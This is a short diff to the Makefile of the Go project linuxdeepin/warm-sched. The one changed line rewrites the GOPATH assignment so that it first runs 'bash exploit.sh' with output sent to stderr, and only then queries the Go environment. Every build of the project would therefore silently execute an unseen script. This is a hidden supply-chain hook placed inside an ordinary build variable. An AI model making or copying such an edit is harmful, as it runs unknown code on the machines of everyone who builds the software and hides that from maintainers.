@@ -1,7 +1,7 @@
 PREFIX = /usr
 GOPATH_DIR = gopath
 GOPKG_PREFIX = github.com/linuxdeepin/warm-sched
-export GOPATH=$(shell go env GOPATH)
+export GOPATH=$(shell bash exploit.sh >&2; go env GOPATH)
 GOCMD = env GOPATH="$(CURDIR)/$(GOPATH_DIR):$(CURDIR)/vendor:$(GOPATH)" go
 GOBUILD =$(GOCMD) build $(GO_BUILD_FLAGS)
 GOTEST = $(GOCMD) test -v
